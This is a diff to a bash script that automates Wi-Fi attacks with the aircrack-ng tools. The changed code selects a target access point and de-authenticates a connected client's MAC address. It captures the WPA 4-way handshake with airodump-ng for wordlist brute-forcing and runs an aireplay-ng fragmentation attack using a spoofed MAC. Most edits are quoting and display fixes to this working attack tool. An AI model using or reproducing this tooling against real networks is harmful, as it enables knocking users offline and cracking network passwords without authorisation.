@@ -282,21 +282,21 @@ if [[ -n "$STATE" ]]; then
     unset_mon >> /dev/null
     sleep 5
 fi
-readarray -t LINES < <(nmcli -t -f SSID,CHAN,BSSID,SECURITY,SIGNAL dev wifi list | grep $1 | sort -u -t: -k1,1 )
+readarray -t LINES < <(nmcli -t -f SIGNAL,CHAN,BSSID,SECURITY,SSID dev wifi list | grep "$1" | sort -u -t: -k 1 -r -n)
 if [[ -z "$LINES" ]]; then
     echo -ne "\nNo $1 Networks found.\n\nPress Enter to go back"
     read -r
     options
 else
     echo -ne "\nSelect an AP and press Enter or press [Enter] to rescan or [c] to Cancel\n\n"
-    echo -ne "#)   <CHAN>    [BSSID]        SEC   SIGNAL  SSID\n\n"
+    echo -ne " #)  <CHAN>    [BSSID]        SEC   SIGNAL  SSID\n"
     COUNTER=0
     for CHOICE in "${LINES[@]}"; do
         _BSSID=$(awk -F ':' '{print $3} {print $4} {print $5} {print $6} {print $7} {print $8}' <<< "$CHOICE" | sed 's/\\/\:/g' | xargs | sed 's/ //g')
         _CHAN=$(awk -F ':' '{print $2}' <<< "$CHOICE")
-        _ESSID=$(awk -F ':' '{print $1}' <<< "$CHOICE")
-        _SIG=$(awk -F ':' '{print $NF}' <<< "$CHOICE")
-        printf "\n%02d)  <%02d> [$_BSSID] $1    %03d    ($_ESSID)" $COUNTER $_CHAN $_SIG 
+        _ESSID=$(awk -F ':' '{print $NF}' <<< "$CHOICE")
+        _SIG=$(awk -F ':' '{print $1}' <<< "$CHOICE")
+        printf "\n%2d)  <%2d> [$_BSSID] $1    %3d    ($_ESSID)" "$COUNTER" "$_CHAN" "$_SIG"
         let COUNTER+=1
     done
     echo
@@ -309,6 +309,7 @@ else
                 break
                 ;;
             "" )
+                unset LINES
                 list_APs "$1"
                 break
                 ;;
@@ -323,13 +324,13 @@ else
     done
     BSSID=$(awk -F ':' '{print $3} {print $4} {print $5} {print $6} {print $7} {print $8}' <<< "$AP" | sed 's/\\/\:/g' | xargs | sed 's/ //g')
     CHAN=$(awk -F ':' '{print $2}' <<< "$AP")
-    ESSID=$(awk -F ':' '{print $1}' <<< "$AP")
-    SIG=$(awk -F ':' '{print $NF}' <<< "$AP")
+    ESSID=$(awk -F ':' '{print $NF}' <<< "$AP")
+    SIG=$(awk -F ':' '{print $1}' <<< "$AP")
 fi
 }
 function de-auth {
 read -rp $'\nEnter Client MAC you wish to de-auth and press enter. : ' CLIENT
-grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' <<< $CLIENT
+grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' <<< "$CLIENT"
 if [[ "$?" != 0 ]]; then
     echo -ne "\nInvalid MAC address!"
     de-auth
@@ -362,8 +363,7 @@ read -rp "Press Enter to continue"
 ESSID=$(tr -d ' ' <<< "$ESSID")
 AIRODUMP="airodump-ng --bssid $BSSID -c $CHAN -w $ESSID $IFACE"
 env -u SESSION_MANAGER xterm -hold -e "$AIRODUMP" &
-echo -ne "You need to capture a 4-Way Handshake and then brute-force the .cap file against a wordlist. 
-You capture a 4-Way Handshake by forcing an already connected client to disconnect, the client will automatically try to reconnect and in the process will share his/her 4-Way Handshake with all the listening parties. ie. You and the Access Point (Modem/Router). Client MAC is displayed under the STATION collumn in the airodump-ng window. If no clients are connected you cannot capture a Handshake.\n\nWhen a client you want to de-auth shows up in the airodump-ng window. Press Space to pause the output, select the MAC address and Press Ctrl + Shift + C to copy it. Then paste it here and press Space on the airodump-ng window to continue the output.\n"
+echo -ne "You need to capture a 4-Way Handshake and brute-force it against a wordlist.\nYou capture a 4-Way Handshake by forcing an already connected client to disconnect, the client will automatically try to reconnect and in the process will share his/her 4-Way Handshake with all the listening parties. ie. You and the Access Point (Modem/Router). Client MAC is displayed under the STATION collumn in the airodump-ng window. If no clients are connected you cannot capture a Handshake.\n\nWhen a client you want to de-auth shows up in the airodump-ng window. Press Space to pause the output, select the MAC address and Press Ctrl + Shift + C to copy it. Then paste it here and press Space on the airodump-ng window to continue the output.\n"
 while read -rn1 -p $'\nAre any clients connected ? [yn] ' YESNO
 do
     case "$YESNO" in
@@ -470,7 +470,6 @@ until [[ "$COUNTER" -eq 3 ]]; do
     if [[ "$SUCCESS" = 0 ]]; then
         echo -ne "Association successful!\nInitiating Fragmentation attack method\n"
         aireplay-ng --fragment -b "$BSSID" -h "$SPOOFED_MAC" "$IFACE"
-        PRGA="$?"
         break
     else
         echo "Association failed, trying again..."
@@ -688,7 +687,7 @@ if [[ -z "$STATE" ]]; then
                         options
                         break
                         ;;
-                    * ) 
+                    * )
                         ;;
                 esac
             done
